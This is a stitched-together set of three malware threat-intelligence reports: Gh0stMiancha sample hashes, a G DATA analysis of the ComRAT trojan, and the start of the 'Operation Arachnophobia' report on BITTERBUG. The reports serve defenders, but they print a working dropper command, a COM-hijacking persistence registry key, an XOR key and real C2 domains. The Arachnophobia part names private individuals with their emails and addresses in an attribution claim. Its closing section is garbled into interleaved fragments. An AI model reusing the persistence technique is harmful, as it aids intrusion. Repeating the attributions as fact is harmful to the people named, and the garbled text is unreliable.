Compile Time             N / A
In - the - wild Filenames    dll.tmp
TrojanLoader : W32/Gh0stMiancha
MD5                      04e7361323b431f7c9f86388f316bbea
SHA1                     e3c095c7ace563b41b3f4310f3de69e47c86fd03
SHA256                   73ef70f1e80e32341eebcb3b1084cf896f6b1aa701b7a6c7abcb9293500d84ae
Size ( bytes )             10299
Compile Time             2013 - 11 - 26 09:34:10 UTC
In - the - wild Filenames    install.ocx
PDB String               h:\2013.11.25\server(壳)\Release\server.pdb
Obfuscated TrojanLoader : W64/Gh0stMiancha
MD5                      01f7b465242237bd3d31d39767aa68e0
SHA1                     db4ec59bf7f34a21f9dc7f2ded68c616f7c0fe47
SHA256                   ed39c1d86ff8cfe18ef58e850d205a678d255150324b00661b91448173c94900
Size ( bytes )             12347
Compile Time             N / A
In - the - wild Filenames    dll64.tmp
TrojanLoader : W64/Gh0stMiancha
MD5                      008fbd0fde06edb31fc7eecdae1a3030
SHA1                     b9ae0a079cd1dae96425ced4bb96ba0f71c87a7a
TLP : WHITE                                         Page 9 / 11
TLP : WHITE
SHA256                   cc8d38d3cc214ff3ad10d6859a88e018b1f7e0ed6df7d04a6f4368bda851ba14
Size ( bytes )             12347
Compile Time             2013 - 11 - 26 11:47:39 UTC
In - the - wild Filenames    install.ocx
PDB String               C:\Users\why\Desktop\server(壳)\x64\Release\server.pdb
Obfuscated Trojan : W32/Gh0stMiancha
MD5                      569071c45f47b7fb7a75f30bc07d5739
SHA1                     540bb9d2dee8f4e10e5ae0a5cc900b346a57a198
SHA256                   8a00b2aefdcd0bb22013bbe9c7941fa16af8246e545e1522622006b9c88ca716
Size ( bytes )             169019
Compile Time             N / A
In - the - wild Filenames    instructions.pdf
Trojan : W32/Gh0stMiancha
MD5                      916b1a07efb145c450b4c13540be6c3e
SHA1                     7984639beb4e9870301d3b44a68b4346f9a6b826
SHA256                   f26c2e9bee680f8e4d7afd73e2984a6697263334d2f0049a40e050d75293035e
Size ( bytes )             169019
Compile Time             2013 - 12 - 06 08:08:28 UTC
In - the - wild Filenames    N / A
PDB String               h:\2013.11.25\白加黑\server(update.dll)(instructions.pdf)\Release\server.pdb
Obfuscated Trojan : W64/Gh0stMiancha
MD5                      55474f8e26f2b6fc3b5d78ce9a77b0b0
SHA1                     3f714c33992e906e69df2d5d4971beaed336d9f4
SHA256                   27e5670f68ff68acc80716c6870f4e5d06c471791f087d5b9b7613f8dc700037
Size ( bytes )             233019
Compile Time             N / A
In - the - wild Filenames    instructions64.pdf
Trojan : W64/Gh0stMiancha
MD5                      1d2c77f0f8a715de09ce6fae5fc800d4
SHA1                     30784735763b060a39f76c29439a6aebbf6a4b9b
SHA256                   2fdf454f6b1c82d757d054bea5f0438f5da1ecd9e5059610d3d4b74e75a7c8b0
Size ( bytes )             233019
Compile Time             2013 - 12 - 06 08:10:34 UTC
In - the - wild Filenames    N / A
PDB String               C:\Users\why\Desktop\server(update.dll)(instructions.pdf)x64\x64\Release\server.pdb
TLP : WHITE                                                             Page 10 / 11
TLP : WHITE
Context Information Security - Threat Intelligence - threat@contextis.co.uk
London ( HQ )             Cheltenham                  Düsseldorf               Melbourne
4th Floor               Corinth House               1.OG                     4th Floor
30 Marsh Wall           117 Bath Road               Adersstr . 28             155 Queen Street
London E14 9TP          Cheltenham GL53 7LS         40215 Düsseldorf         Melbourne VIC 3000
United Kingdom          United Kingdom              Germany                  Australia
TLP : WHITE                                              Page 11 / 11

The Uroburos case : new sophisticated RAT identified
In February 2014 , the experts of the G DATA SecurityLabs published an analysis of Uroburos , the
rootkit with Russian roots . We explained that a link exists between Uroburos and the Agent . BTZ
malware , which was responsible for " the most significant breach of U.S. military computers ever . "
[ 1 ] Nine months later , after the buzz around Uroburos , aka Snake or Turla , we now identified a new
generation of Agent . BTZ We dubbed it ComRAT and , by now , analyzed two versions of the threat
( v3.25 and v3.26 ) .
As reported earlier this year , Agent . BTZ used the same encoding key and the installation log file name as Uroburos .
ComRAT , in its version 3.25 , shows the same behavior . Furthermore , the attackers also shared a C&C domain . The
latest version of ComRAT known to us ( v3.26 ) uses a new key and does not create the installation log file , in order to
complicate the analysis and to disguise the link between the two cases .
Another very interesting fact : the attackers use COM Object hijacking , the same persistence mechanism as
COMpfun , which we described recently .
Taken everything into consideration , the indications we saw during our analyzes lead to the supposition that the
group behind Agent . BTZ and Uroburos is still active and is pursuing the Agent . BTZ path once more to improve and
change the RAT .
Dropper
The analyzed file is the latest version we identified : v3.26 . The version identification is described in the chapter “ Log
files ” . The major difference between this version and the older version(s ) will be described there .
File installation
The first task of the malware is to install the file credprov.tlb in % APPDATA%\Microsoft\. This file is the main
payload of the malware . The dropper executes the following command in order to install a second file :
rundll32.exe % APPDATA%\Microsoft\credprov.tlb , Install % APPDATA%\Microsoft\shdocvw.tlp
The second file is shdocw.tlp . The two files are Microsoft Windows dynamic libraries .
Persistence
To be started during the boot process of the infected machine , the malware creates the following registry key :
HKCU\Software\Classes\CLSID\{42aedc87 - 2188 - 41fd - b9a3 - 0c966feabec1}\InprocServer32 =
% APPDATA%\shdocvw.tlp
This registry key is used to associate the library shdocvw.tlp to the object 42aedc87 - 2188 - 41fd - b9a3 - 0c966feabec1
as previously explained in the article about COMpfun . The purpose is to load the library into each and every process
executed on the infected system .
Dropper ’s log file
If the version of the malware is older than 3.26 , the dropper creates an additional file called winview.ocx . We
noticed that the file name is still the same as the file name used by Agent . BTZ in the past . The file is xored with the
following obfuscation key ( used by both , Uroburos and Agent . BTZ ) :
1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s
Here is the decoded log file content :
user1@gdata$ ./decode.py winview.ocx
Log begin : 06.11.2014 22:55:55
TVer=2.2
06.11.2014 22:55:55 TVer=2.3
06.11.2014 22:55:55 CFG : CFG_4
06.11.2014 22:55:55 User : user1
06.11.2014 22:55:55 Machine : x86
06.11.2014 22:55:55 Removing C:\Documents and Settings\user1\Application Data\\Microsoft\\shdocvw.tlb [ 2 ]
06.11.2014 22:55:55 Removing C:\Documents and Settings\user1\Application Data\\Microsoft\\oleaut32.dll [ 2 ]
06.11.2014 22:55:55 Removing C:\Documents and Settings\user1\Application Data\\Microsoft\\oleaut32.tlb [ 2 ]
06.11.2014 22:55:55 Removing C:\Documents and Settings\user1\Application Data\\Microsoft\\credprov.tlb [ 2 ]
06.11.2014 22:55:55 Removing C:\Documents and Settings\user1\Application Data\\Microsoft\\libadcodec.dll [ 2 ]
06.11.2014 22:55:55 Removing C:\Documents and Settings\user1\Application Data\\Microsoft\\libadcodec.tlb [ 2 ]
06.11.2014 22:55:55 Writing C:\Documents and Settings\user1\Application Data\\Microsoft\\shdocvw.tlb 51200B
Ok
06.11.2014 22:55:56 Writing C:\Documents and Settings\user1\Application Data\\Microsoft\\credprov.tlb
260096B Ok
06.11.2014 22:55:57 Exit code1 0
06.11.2014 22:55:57 Writing 3072B Ok
We can notice that the malware checks if an older version is installed on the system and if this is the case , the
dropper removes the older version . In contrast to this , in our Uroburos analysis , we found out that Uroburos does
not install itself in case a version of Agent . BTZ was found on a system .
Execution flow and features
During the startup of the infected machine , the shdocvw.tlp library is loaded into all processes . If the process is
explorer.exe , this library will load the other library called credprov.tlb . This library is the real payload . Its features
are common for a Remote Administration Tool ( RAT ) :
command execution ;
file download ;
file upload ;
information gathering .
ComRAT ’s communication to the command and control server is performed by the browser process and not by
explorer.exe in order to avoid being blocked by a firewall on the system or any additional security products . The
communication between the processes is performed by named pipe .
Log files
Two log files are created during the malware execution : mskfp32.ocx and msvcrtd.tlb . If the malware version is
older than 3.26 , the xored key is the same as the dropper key . Concerning the version 3.26 , the malware uses a new
non - ASCII key . Here is an example of decoded log file for the version 3.26 :
user1@gdata$ ./decode.py mskfp32.ocx
< ? xml version="1.0 " encoding="unicode " ? >
< Ch >
< TVer>2.1</TVer >
< AppendLog>0</AppendLog >
< add key="Id " value="168466483094462 " / >
< add key="PVer " value="3.26 " / >
< add key="OSVer " value="512600 Service Pack 30 " / >
< add key="Machine " value="x86 " / >
< add key="CryptKeyType " value="3 " / >
< add key="CryptKeyId " value="0 " / >
< add ke="IsAdmin " value="1 " / >
< add key="Http idx1 " value="4294967295 " / >
< add key="Http idx2 " value="4294967295 " / >
< add key="Http timeout " value="60 " / >
< add key="Time " value="06:11:2014 15:54:34 " / >
< add key="Bias " value="-2 " / >
< add key="PcName " value="USER1-ABC1234 " / >
< add key="UserName " value="user1 " / >
< add key="WinDir " value="C:\\WINDOWS " / >
< add key="TempDir " value="C:\\DOCUME~1\\user1\\LOCALE~1\\Temp\\ " / >
< add key="WorkDir " value="C:\\ Documents and Settings\user1\Application Data\\Microsoft\\ " / > '
< /Ch >
We can identify the version of the malware thanks to the PVer flag . The command and control server information is
stored in the registry , not in an XML , and encoded :
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\SessionMRU\IPlace
For example , in the analyzed sample the CC is : weather-online.hopto.org . This domain is far from unknown , as it
has been mentioned in BAE System ’s Uroburos ( aka Snake ) analysis paper as C&C server domain for the Uroburos
malware . Another connection between the cases .
If the malware version in lower than 3.26 , the XML log file contains the command and control server information :
[ … ]
< add ke="IsAdmin " value="1 " / >
< add key="Http address " value="webonline.mefound.com " / >
< add key="Http address " value="sportacademy.my03.com " / >
< add key="Http address2 " value="easport - news.publicvm.com " / >
< add key="Http address2 " value="new - book.linkpc.net " / >
< add key="Http idx1 " value="4294967295 " / >
[ … ]
Summary
Let us summarize the similarities and differences between Agent . BTZ , Uroburos and ComRAT as far as we can :
Similarities :
Before version 3.26 :
use of the same xor key
use of the same file name for the log
On all versions :
Some parts of the code are exactly the same ( appears to be copy & paste )
That is the reason why the sample is detected as Uroburos ( aka Turla ) . The same code was used by Agent . BTZ
and also the dll loaded into userland during the Uroburos analysis .
Command and control server domains are shared between Uroburos and ComRAT .
Differences :
In version 3.26 , the author changed the key and remove the known file name
This action can be an indication for the developer ’s effort to hide this connection
The main difference is the design
Agent . BTZ is a common RAT , a simple library executed on an infected machine . ComRAT is more complex
and cleverer . The malware is loaded into each and every process of the infected machine and the main part
( payload ) of the malware is only executed in explorer.exe . Furthermore , the C&C communication blends into
the usual browser traffic and the malware communicates to the browser by named pipe . It is by far a more
complex userland design than Agent . BTZ .
These differences , mainly the more complex design , lead us to give this malware a new name .
The analyzed dropper of v3.25 has a compilation date of February 6th 2014 . The more recent dropper of v3.26 ,
which has all the mentioned changes implemented , reveals a compilation date of January 3rd 2013 . We suspect that
this date is spoofed in order to disguise that this is in fact a newer version .
Conclusion
This analysis shows that even after the Uroburos publication in February 2014 , the group behind this piece of
malware seems to be still active . In any case , the ComRAT developers implemented new mechanisms , changed keys ,
removed log files to hide their activities and tried to disguise the connections between the RAT ComRAT , the rootkit
Uroburos and the RAT Agent . BTZ as much as possible . However , we can still follow the evolution of the malware by
comparing the versions .
The persistence mechanism discovered in October 2014 makes it possible to intrude into a system in a really discreet
manner and we estimate that other actors will use the same persistence mechanism in the near future .
We will definitely keep our ears and eyes open and continue analyzing .
IOC
MD5
51e7e58a1e654b6e586fe36e10c67a73 ( dropper v3.25 )
e6ce1f962a47479a86ff2e67129f4ecc ( lib1 , v3.25 )
ec7e3cfaeaac0401316d66e964be684e ( lib2 , v3.25 )
0ae421691579ff6b27f65f49e79e88f6 ( dropper v3.26 )
255118ac14a9e66124f7110acd16f2cd ( lib1 v3.26 )
b407b6e5b4046da226d6e189a67f62ca ( lib2 , v3.26 )
8ebf7f768d7214f99905c99b6f8242dc ( dropper , unknown version )
9d481769de63789d571805009cbf709a ( dropper , unknown version )
83a48760e92bf30961b4a943d3095b0a ( lib 64-Bit , unknown version )
ea23d67e41d1f0a7f7e7a8b59e7cb60f ( lib 64-Bit ; unknown version )
Paths
% APPDATA%\\Microsoft\\shdocvw.tlb
% APPDATA%\\Microsoft\\oleaut32.dll
% APPDATA%\\Microsoft\\oleaut32.tlb
% APPDATA%\\Microsoft\\credprov.tlb
% APPDATA%\\Microsoft\\libadcodec.dll
% APPDATA%\\Microsoft\\libadcodec.tlb
Registry
HKCU\Software\Classes\CLSID\{42aedc87 - 2188 - 41fd - b9a3 - 0c966feabec1}\InprocServer32
Command and control
weather-online.hopto.org
webonline.mefound.com
sportacademy.my03.com
easport-news.publicvm.com
new-book.linkpc.net
-------------------------------
Related articles :
October 30th 2014 : COM Object hijacking : the discreet way of persistence
June 2nd 2014 : Analysis of Uroburos , using WinDbg
May 13th 2014 : Uroburos rootkit : Belgian Foreign Ministry stricken
March 3rd 2014 : Uroburos - Deeper travel into kernel protection mitigation
February 28th 2014 : Uroburos - highly complex espionage software with Russian roots
-------------------------------
[ 1 ] www.foreignaffairs.com/articles/66552/william-j-lynn-iii/defending-a-new-domain

Operation
Arachnophobia
Caught in the Spider ’s Web
Rich Barger | Cyber Squared Inc.
Mike Oppenheim | FireEye Labs
Chris Phillips | FireEye Labs
Contents
Team Introduction ....................................................................................................................................................... 1
Key Findings .................................................................................................................................................................. 1
Summary ....................................................................................................................................................................... 1
Backstory ...................................................................................................................................................................... 2
VPSNOC / Digital Linx / Tranchulas ............................................................................................................................ 4
Technical Observations ............................................................................................................................................... 8
Conclusion .................................................................................................................................................................... 11
Appendix A : Malware Details ................................................................................................................................... 12
Appendix B : MD5 Hashes and Malware Table ........................................................................................................ 17
Appendix C : VPSNOC Email Header Analysis ....................................................................................................... 20
Appendix D : Inconsistencies Observed ................................................................................................................... 21
Appendix E : VPSNOC & Digital Linx Associations ................................................................................................. 23
Appendix F : Personas ................................................................................................................................................. 24
Persona # 1 ................................................................................................................................................................................ 24
Persona # 2 ................................................................................................................................................................................ 27
Appendix G : Tranchulas ........................................................................................................................................... 30
Digital Appendix 1 : Research Collateral ................................................................................................................... 32
Digital Appendix 2 : Raw Email Communications ................................................................................................... 33
Digital Appendix 3 : Screenshot Archives ................................................................................................................ 34
Digital Appendix 4 : Maltego Visualization ............................................................................................................. 35
i     •      OPERATION ARACHNOPHOBIA
Team Introduction
Cyber Squared Inc. ’s ThreatConnect Intelligence Research Team ( TCIRT ) tracks a number of threat groups around the world .
Beginning in the summer of 2013 , TCIRT identified a suspected Pakistani - origin threat group . This group was revealed by TCIRT
publicly in August 2013 . In the months following the disclosure , we identified new activity . Cyber Squared partnered with experts
at FireEye Labs to examine these new observations in an attempt to discover new research and insight into the group and its
Operation “ Arachnophobia ” . The following report is a product of collaborative research and threat intelligence sharing between
Cyber Squared Inc. ’s TCIRT and FireEye Labs .
Key Findings
• 	  While we are not conclusively attributing BITTERBUG activity to Tranchulas or a specific Pakistani entity , we can confidently
point to many characteristics of a Pakistan - based cyber exploitation effort that is probably directed against Indian targets and/or
those who are involved in India - Pakistan issues .
• 	  The threat actors utilized a hosting provider that is a Pakistani - based company with subleased VPS space within the U.S. for
command and control ( C2 ) .
• 	  The customized malware ( BITTERBUG ) used by these threat actors has only been observed hosted on and communicating with
two IP addresses operated by a Pakistan - based hosting provider .
• 	  Early variants of the BITTERBUG malware had build paths containing the strings “ Tranchulas ” and “ umairaziz27 ” .
Tranchulas is the name of a Pakistani security firm ; Umair Aziz is the name of a Tranchulas employee .
• 	  Following the release of our blog post highlighting this activity and the malware ’s build strings , the threat actors appear to have
modified their binary file paths to make them more generic .
• 	  Employees at both the Pakistan - based hosting provider and Tranchulas appear within each others’ social networks .
Summary
On August 2 , 2013 , the TCIRT published the blog “ Where There is Smoke , There is Fire : South Asian Cyber Espionage Heats
Up ” in which TCIRT identified custom malware , later dubbed BITTERBUG by FireEye , suspected to be linked to Pakistani - based
exploitation activity directed against Indian entities . We found debug path references to “ Tranchulas ” , which is also the name
of a Pakistani security company . Tranchulas claims to support “ national level cyber security programs ” and the development of
offensive and defensive cyber capabilities . At the time , the incident seemed to be an isolated one for TCIRT , but it was only the
beginning . Our suspicions of Tranchulas’ involvement in the activity began to mount , based on a series of events that occurred
both before and after the release of our blog post .
During the past year , we communicated with Tranchulas and the Pakistan - based hosting provider . Suspicious responses and
oddly similar replies received from both companies to our inquiries , as well as anomalies in their email headers , prompted us to
research the companies further . Our research revealed :
• 	  The C2 hosting provider ( VPSNOC ) has likely been conducting business operations from within Pakistan , subleasing
infrastructure from U.S. providers .
• 	  VPNSOC and Tranchulas employees have maintained some type of undefined relationship given connections via social media .
• 	  Both organizations have employed or are affiliated with personnel who have offensive cyber expertise .
• 	  When TCIRT was initially contacted by Tranchulas following our original blog post , they denied any involvement in the activity .
Tranchulas maintained that they were being framed , and that they were already aware of the activity prior to both our blog post
and our contact . However , inconsistencies in their claims and their responses made such a scenario questionable .
1     •     OPERATION ARACHNOPHOBIA
Backstory
TCIRT began tracking a set of activity involving a BITTERBUG variant in May 2013 . To our knowledge this customized malware
has only ever been observed hosted on and communicating with two command and control nodes : 199.91.173.431 and
199.91.173.45.2 3 According to Whois records , those IP addresses were registered to a web - hosting firm in Kansas City ,
Missouri . Based on public records , this organization appears to be a legal entity chartered to conduct business in Missouri.4
On July 24 , 2013 , TCIRT contacted the Kansas City - based hosting provider to notify them of the malicious activities emanating
from IP address 199.91.173.43 . The hosting provider subsequently introduced5 TCIRT to their client VPNSOC , the customer
responsible for subleasing the IP address . Later that day , TCIRT received a response6 from support@vpsnoc.com providing
limited information on the server and related traffic ( Figure 2 ) . When TCIRT sent follow - up communications , VPSNOC did not
respond , further increasing our suspicions .
Figure 2 : VPSNOC Response
1 	        https://www.virustotal.com/en/ip-address/199.91.173.43/information/
2 	        https://www.virustotal.com/en/ip-address/199.91.173.45/information/
3 	        http://www.shodanhq.com/search?q=93c546-b1-4dbcbc6438380
4 	        https://bsd.sos.mo.gov/BusinessEntity/BusinessEntityDetail.aspx?page=beSearch&ID=2936099
5 	        Digital Appendix 2 : Email#1 Subject- Re- Contact Info ( Date- We d , 24 Jul 2013 14 - 00 - 29 -0500).eml
6 	        Digital Appendix 2 : Email#2 Subject- Re- Contact Info ( Date- Thu , 25 Jul 2013 02 - 28 - 41 + 0500).eml
2     •     OPERATION ARACHNOPHOBIA
While reviewing the metadata of VPSNOC ’s July 24 , 2013 email response , we noticed the email was sent from a + 0500 time zone .
This time zone usage is consistent with Pakistan ’s time zone.7
The TCIRT published details of the initial activity in the aforementioned blog post on August 2 , 2013 . Four days later on August 6 ,
2013 , the Tranchulas Chief Executive Officer , Zubair Khan , contacted us regarding the blog post and its subsequent press coverage.8
Khan submitted “ Response_ThreatConnect.docx”9 as an explanation of the observed activity to both the media and the
TCIRT indicating that the debug paths using “ Tranchulas ” and “ umairaziz27 ” was “ done by developer of malware to portray
wrong impression about Tranchulas and mislead malware analysts ” . Notably , Khan included a screenshot of an email message . The
message was reportedly a response from VPSNOC to an email message from Tranchulas sent on July 21 , 2013 , purportedly to notify
VPSNOC of the same malicious activity identified by TCIRT . However , we noted certain anomalies in this message .
Figure 3 : Screenshot ( image1.png ) included within Response_ThreatConnect.docx
As seen in Figure 3 the “ email message ” 10 was “ sent ” to VPSNOC from an unidentified tranchulas.com email address on “ Tue ,
Jul 21 , 2013 at 11:36 PM . ” July 21 , 2013 was not a Tuesday and in fact was a Sunday . The mismatched date suggests that this
email message was potentially modified in order to support the claim that Tranchulas was aware of , and had already reported the
exploitation activity . TCIRT speculates that “ Tuesday ” was hastily chosen because our own official notification to VPSNOC was sent
on Wednesday the 24th . In addition , the “ response ” received by Tranchulas is nearly identical to that received by TCIRT . We believe
that Tranchulas may have obtained information about TCIRT ’s notification to VPSNOC through a pre - established relationship.11
7 	 Digital Appendix 2 : Raw Email Communications ( Email#2 Subject- Re- Contact Info ( Date- Thu , 25 Jul 2013 02 - 28 - 41 + 0500.eml ) &
( Email#1 Subject- Re- Contact Info ( Date- We d , 24 Jul 2013 14 - 00 - 29 -0500.eml )
8 	         http://www.theregister.co.uk/2013/08/07/india_cyberespionage/
9 	 Digital Appendix 2 : Raw Email Communications ( Email#3 Subject- Re- Regarding 20130731A- South Asia Cyber Espionage Heats Up
( Date- We d , 7 Aug 2013 03 - 18 - 57 + 0500).eml )
10 	        Digital Appendix 1 : Research Collateral image1.png ( MD5:d224f39f8e20961b776c238731821d16 ) within Response_ThreatConnect.docx
11 	        Appendix F : Personas ( Persona # 2 )
3      •     OPERATION ARACHNOPHOBIA
The TCIRT responded to Mr. Khan ’s official explanation with a follow - up inquiry , offering Khan an opportunity to explain the notable
date inconsistency within the email screenshot . The TCIRT also requested that Mr. Khan share the actual email message with the
original attached headers . Mr. Khan did not address the TCIRT question , but rather deferred our request to Mr. Hamza Qamar ,
a Penetration Testing Team Lead at Tranchulas . On August 15 , 2013 , three days later , Qamar responded to TCIRT with a brief
denial12 of any modifications to the screenshot ( other than email address anonymization ) and specifically referred TCIRT back to
VPSNOC support ( support@vpsnoc.com ) for any follow up questions .
Astonished by this dismissal and deflection , TCIRT immediately began to explore the relationship between VPSNOC and Tranchulas .
VPSNOC / Digital Linx / Tranchulas
During our research into VPSNOC , we identified that it is actually based in , or conducts partial operations from within , Pakistan .
The company only gives the impression of operating from Kansas City through marketing and the use of leased IP space ( Figure
4 ) . The Whois records for vpsnoc.com revealed that the domain was registered by Digital Linx Hosting . Digital Linx is also a
Pakistan - based hosting company ( Figure 5 ) .
Figure 4 : Screenshot of VPSnoc.com About us page
12 	 Digital Appendix 2 : Raw Email Communications ( Email#4 Subject- Re- Regarding 20130731A- South Asia Cyber Espionage Heats Up -
( Date- Thu , 15 Aug 2013 12 - 52 - 54 + 0500).eml
4    •    OPERATION ARACHNOPHOBIA
Figure 5 : Digital Linx ( digitallinx.com )                              Figure 6 : Screenshot of DigitalLinx.net
Website indicating its location                                                 contact page
As seen in Figure 6 , the administrative email address is admin@digitallinx.org.13 This is the same registrant record for the
digitallinx.net domain.14 The domains digitillinx.org , digitallinx.net , and digitallinx.com share current
and historical similarities in their WHOIS records and sitemap.xml files 15 16 that imply they are all controlled by the same individual
or entity . The domain digitallinx.com is registered to Muhammad Naseer   Bhatti ( Digital Linx Founder)17 18 19 who uses email
addresses naseer@digitallinx.com and nbhatti@gmail.com . The domain is also registered to the address 638-F Johar
Town , Lahore Pakistan.20
The contact telephone number listed on Digital Linx’ web site is 925 - 665 - 1427 ( Figure 6 ) , and is also used in the WHOIS record
for defiantmarketing.com21 .
The domain defiantmarketing.com is registered to Abunasar Khan . The registration lists VPSNOC as the registrant organization ,
abunasar@yahoo.com as the registration email address , and House 12 , Street 21 , F-8/1 Islamabad Federal 44000 as the
registration address . Abunasar Khan has been observed using the aliases “ agnosticon ” 22 and “ agnostic ” . From this we were able to
locate an advertisement in the Blackhatworld forum from April 2012 posted by agnosticon promoting VPSNOC and identifying it as
a subdivision of Digital Linx Hosting ( Figure 7).23 Though none of this information is surprising , it further suggests that both Bhatti and
Abunasar Khan work or worked for Digital Linx and VPSNOC and during that time were both located in Pakistan.24
13 	        https://whois.domaintools.com/vpsnoc.com
14 	        https://whois.domaintools.com/digitallinx.net
15 	        http://webcache.googleusercontent.com/search?q=cache:CtCiQUGgUaoJ:www.digitallinx.net/sitemap.xml+&cd=1&hl=en&ct=clnk&gl=us
16 	        http://digitallinx.net/Contact.html
17 	        https://whois.domaintools.com/digitallinx.com
18 	        http://sa.linkedin.com/pub/muhammad-naseer-bhatti/9/18a/815
19 	        https://groups.google.com/forum/#!original/securityfocus2/9325p2as3IU/BqKQJwdlZ4YJ
20 	        https://github.com/digitallinx/vBilling/blob/master/CHANGELOG
21 	        https://whois.domaintools.com/defiantmarketing.com
22 	        http://www.blackhatworld.com/blackhat-seo/members/32481-agnosticon.html
23 	        http://www.blackhatworld.com/blackhat-seo/hosting/430705-unmetered-vps-hosting-get-50-off-your-first-month-exclusive-coupons-bhw.html
24 	        https://dazzlepod.com/rootkit/?page=284
5      •      OPERATION ARACHNOPHOBIA
Figure 7 : Blackhatworld advertisement identifying VPSNOC as a Digital Linx subdivision25
Additional research into Abunasar Khan identified several registered domains and fragments of his online presence . Based on his
websites and account information , he appears to have an interest or participated in the Antisec26 and Anonymous27 movements
( Figure 8) . He also used “ anony mo us ” in the registration name field of a personal account 28 .
In addition , Abunasar Khan ’s Google+ profile revealed connections to at least one Tranchulas employee , Hamza Qamar29 and a
Digital Linx employee , Shoaib Riaz.30 31Hamza Qamar , the Team Lead for Penetration Testing at Tranchulas , with whom TCIRT last
spoke.32 Visiting Hamza Qamar ’s Google+ page ( Figure 9 ) , the only directly connected person was Abunasar Khan . At this point , it
shows that a probable VPNSOC employee with ties or interests in hacking has an undefined but potentially close relationship with
Hamza Qamar , the Penetration Testing employee from Tranchulas .
Figure 8 : Abunasar.net main page
25 	        http://vpsnoc.com/order.png
26 	        http://abunasar.net
27 	        http://pastebin.com/rqVGqh1q
28 	        https://dazzlepod.com/rootkit/?page=284
29 	        https://plus.google.com/105774284158907153401/about
30 	        https://plus.google.com/105059395104464629441/about
31 	        http://lists.horde.org/archives/horde/Week-of-Mon-20061225/032545.html
32 	        https://plus.google.com/103436628630566104748/posts
6      •      OPERATION ARACHNOPHOBIA
Figure 9 : Qamar ’s only connection out of 40 + followers
Qamar indicated on his public LinkedIn profile that he “ engaged in system and enterprise level network and Web application
security testing for clients ranging from large federal agencies , DoD , and commercial clients ” , though it is unclear which “ DoD ”
is referenced ( e.g. , whether the Pakistani Ministry of Defense or some other nation ’s defense department ) . Tranchulas identifies
government ( presumably Pakistan ’s government ) as an operational sector for its work . Tranchulas’ offensive cyber initiative
services are offered to “ national - level cyber security programs ” 33 34 indicating commercial demand from “ national - level ” customers .
Though Tranchulas35 brands itself as a multi - national company , with respective addresses within the United Kingdom36 , the United
States37 , and New Zealand38 . We found evidence that these addresses are all associated with either virtual office spaces or
address forwarding services .
For further background information on these personas , please see Appendix F : Personas .
The following is a summary of the relationships between the hosting organizations and Tranchulas :
• 	  VPNSOC IP space was used as command and control nodes for attackers using variants of the BITTERBUG malware that
contained build strings that referenced “ Tranchulas ” and a Tranchulas employee .
• 	  Tranchulas and VPNSOC were in direct communication at some point in July - August 2013 .
• 	  VPNSOC is a subsidiary of Digital Linx .
• 	  Tranchulas , VPNSOC , Digital Linx were all physically located in Pakistan but maintained virtual presence within the U.S.
• 	  Hamza Qamar was an employee of Tranchulas .
33 	 http://www.prnewswire.co.uk / news - releases / tranchulas - steps - into - the - global - cyber - strategy - market - with - launch - of - the - offensive - cyber-
initiative-oci-230411011.html
34 	        Digital Appendix 3 : Screenshot Archives ( tranchulas.com/offensive-cyber-initiative-oci.png )
35 	        Digital Appendix 3 : Screenshot Archives ( tranchulas.com/contact-us )
36 	        http://www.londonpresence.com/contact-us/
37 	        http://nextspace.us/nextspace-union-square-san-francisco/
38 	        http://www.privatebox.co.nz/virtual-office/virtual-office-address.php
7      •     OPERATION ARACHNOPHOBIA
• 	  Muhammad Naseer   Bhatti was the self - proclaimed founder of Digital Linx .
• 	  Abunasar Khan was affiliated with AntiSec and VPNSOC .
• 	  Digital Linx founder Muhammad Naseer   Bhatti had at least a working relationship with VPNSOC employee Abunasar Khan39 –
connected through domain registrations and a common Google+ profile for Shoaib Riaz ( another Digital Linx employee ) .
• 	  VPNSOC employee Abunasar Khan had a direct connection to Tranchulas employee Hamza Qamar through Google+ .
Note : A walkthrough of our research is available in Appendices C , D and E.
Technical Observations
Metadata Analysis :
As mentioned earlier , during the email exchanged with Zubair Khan , he sent TCIRT a Microsoft Word document ( .docx ) . In
reviewing the document metadata for “ Response_ThreatConnect.docx “ , TCIRT identified that it contained the creator
properties of “ hp . ” TCIRT compared the metadata of two benign BITTERBUG - associated decoy documents from July 2013 and
found that both also had the author of “ hp ” ( Figure 10 ) .
Decoys associated with BITTERBUG                                Tranchulas Documents
Figure 10 : Matching Document Author Metadata
39 	        http://www.know-hosting.com/view/27108-digitallinx.html
8      •     OPERATION ARACHNOPHOBIA
While the author field of “ hp ” does n’t conclusively prove a relationship , it contributes to the body of circumstantial evidence which
links properties of the official Tranchulas response to the properties of decoy documents that were used in conjunction with
BITTERBUG targeting campaigns .
Malware Analysis :
CyberSquared Inc. partnered with FireEye for a second technical review of the malware associated with this activity . FireEye
analyzed the malware ,    which
date .
The
they call
earliest
BITTERBUG ,
samples
and determined
of
BITTERBUG
it to be
contain
the
“ Tranchulas ”

a custom    backdoor . The backdoor
debug
path
relies on various
support components , including
( below ) ,
the non - malicious ,
as
mentioned
in
the
Apublically available
ugust
2013
Libcurl
TCIRT
for
blog

40
installation ,
post .
These
Blaunch , and communications . In
ITTERBUG

some variants , variants

BITTERBUG     were

hasptherobably

ability toused
in
attacks

automatically       targetaround
summer

and exfiltrate      2013 ,

files          using
possible

with extensions      such aslures

.doc , .xls , .pdf , .ppt ,
date .

.egm , and .xml . TheTfull
he

related
earliest

tmalware
o
samples
odf
eath

the
then-­‐recent

report is included    BITTERBUG

in o              cA : ontain

f
“ Sarabjit

Appendix                  the

Singh ”

Malware            “ Tranchulas ”

( an

Details .                  debug

Indian
national
path

imprisoned

( below ) ,
as
maentioned

in
Pakistan )
in
the

nd
an
Indian
August
2013

Government
TCIRT
m
pension
blog
post .
These

emorandum .
As
BsITTERBUG

tated
in
the

The earliest evidence of w
variants

original
the malware
ere

blog
( pand
rfamily
robably
udates
sed

aised
toafApril
in
tihe

n
2013 ,
ttacks

ormal
basedson
aTround
Portable
ummer

ranchulas
Executable
2013 ,

response ) ,
sing
( PE )
sueveral
compile
possible
times , with more than
lures

binaries

10 BITTERBUG variants
related

contain
robserved
to
to date .      The
the
then-­‐recent

eferences
earliest
to
“ Cath ”

death
“ samples
in
otf
he
debug
ofpSBITTERBUG
Sarabjit
ingh ”

ath .
It
i(s

an
contain nthe
Indian

important
to
“ Tranchulas ”
ational
that
the
debug path ( below ) ,
note
imprisoned

as mentionedin

